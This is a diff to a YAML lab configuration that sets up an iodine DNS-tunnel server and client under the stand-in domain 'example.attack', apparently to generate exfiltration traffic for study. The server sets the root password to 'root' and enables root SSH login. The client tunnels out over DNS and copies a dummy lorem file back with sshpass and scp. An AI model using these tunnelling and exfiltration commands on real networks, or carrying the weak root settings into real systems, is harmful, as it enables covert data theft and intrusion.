@@ -5,10 +5,27 @@ dns_attack_server:
       This sets up the IODINE server.
     setup:
         type: shell
-        val: apt-get install something
+        val: |
+          echo "Installing IODINE"
+          apt-get update && DEBIAN_FRONTEND=noninteractive apt-get install -y git make build-essential pkg-config zlib1g-dev net-tools openssh-server iputils-ping netcat dnsutils libtext-lorem-perl sshpass
+          cd /opt && git clone https://github.com/yarrick/iodine.git
+          cd /opt/iodine && make && make install
+
+          echo "Setup SSH Daemon"
+          mkdir /var/run/sshd
+          echo "root:root" | chpasswd
+          sed -ri "s/^#?PermitRootLogin\s+.*/PermitRootLogin yes/" /etc/ssh/sshd_config
+          sed -ri "s/UsePAM yes/#UsePAM yes/g" /etc/ssh/sshd_config
+          mkdir /root/.ssh
+
+          echo "Setting up testfile"
+          cd /root && lorem -p 10000 > test-file
+
     run:
         type: shell
-        val: python3 web_server.py
+        val: |
+          /usr/sbin/sshd -D
+          iodined -4 -c -f 10.0.0.1 example.attack -P "{{ variables.passphrase }}"
 
 dns_attack_client:
     name: iodine_client
@@ -18,12 +35,15 @@ dns_attack_client:
     setup:
       type: shell
       val: |
-        echo "woop"
+        echo "Installing IODINE"
+        apt-get update && DEBIAN_FRONTEND=noninteractive apt-get install -y git make build-essential pkg-config zlib1g-dev net-tools openssh-server iputils-ping netcat dnsutils libtext-lorem-perl sshpass
+        cd /opt && git clone https://github.com/yarrick/iodine.git
+        cd /opt/iodine && make && make install
     run:
         type: shell
         val: |
-          echo "{{ variables.a }}"
-          echo "{{ variables.b }}"
+          iodine -4 -f -P "{{ variables.passphrase }}" -T"{{ variables.record_type }}" -O"{{ variables.encoding }}" -r 172.18.0.4 example.attack
+          sshpass -p "root" scp -r -oStrictHostKeyChecking=no root@10.0.0.1:test-file /tmp/
 
     #setup:
     #    type: ansible
@@ -33,5 +53,6 @@ dns_attack_client:
     #    val: 'run.py'
 
     variables:
-        - a: ["woop", "w00p","1235","2342134","123133"]
-        - b: ["f00", "b4r","123","234234","12333"]
+        - record_type: ["null", "srv", "cname", "txt", "private", "mx", "a"]
+        - encoding: ["raw", "base32", "base64", "base128"]
+        - passphrase: ["0xDEADBEEF"]
